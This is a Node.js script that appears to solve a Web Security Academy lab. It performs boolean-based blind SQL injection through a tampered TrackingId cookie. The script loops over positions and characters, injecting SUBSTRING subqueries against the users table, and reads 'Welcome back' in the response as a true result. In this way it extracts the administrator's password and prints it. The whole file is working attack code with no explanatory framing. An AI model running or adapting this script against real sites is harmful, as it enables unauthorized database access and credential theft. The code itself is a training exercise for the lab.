import axios from "axios";

const testCookie = () => {
  return "TrackingId=JcjoRoS86cf8b9fk' AND '1'='1; session=NdJnfkqVdFQuNEtPr7gTZ60c0ZN4PGct";
};
const getModifiedCookie = (substrPosition, payload) => {
  return `TrackingId=JcjoRoS86cf8b9fk' AND (SELECT SUBSTRING(password,${substrPosition},1) FROM users WHERE username='administrator')='${payload}; session=NdJnfkqVdFQuNEtPr7gTZ60c0ZN4PGct`;
};

const checkMatchedPayload = (data, positon, char) => {
  const searchString = "Welcome back";
  const index = data.indexOf(searchString);

  if (index !== -1) {
    console.log(`match found! @${positon}, char - ${char}`);
    return { positon, char };
  } else {
    console.log("no match found...");
    return "no match found...";
  }
};

const shortenHTML = (html) => {
  let lines = html.split("\n");
  let sliced = lines.slice(0, 55);
  return sliced.join("\n");
};

const makeReqWithDelay = async (delay) => {
  let result = [];
  let payloads = "0123456789abcdefghijklmnopqrstuvwxyz".split("");
  const url =
    "https://0ac20008046810a5830982c300f300d6.web-security-academy.net";

  for (let substrPosition = 1; substrPosition <= 20; substrPosition++) {
    for (let j = 0; j < payloads.length; j++) {
      try {
        const response = await axios.get(url, {
          headers: {
            Cookie: getModifiedCookie(substrPosition, payloads[j]),
          },
        });
        console.log(
          `Testing...: ${getModifiedCookie(substrPosition, payloads[j])}`
        );

        const matchResult = checkMatchedPayload(
          shortenHTML(response.data),
          substrPosition,
          payloads[j]
        );
        if (matchResult !== "no match found...") {
          result.push(matchResult);
          break;
        }
      } catch (error) {
        console.error(error);
      }
      await new Promise((resolve) => setTimeout(resolve, delay));
    }
  }

  console.log(result);
  const password = result.map((x) => x.char).join("");
  console.log(`username: administrator | password: ${password}`);
};

makeReqWithDelay(50); // add delay in ms
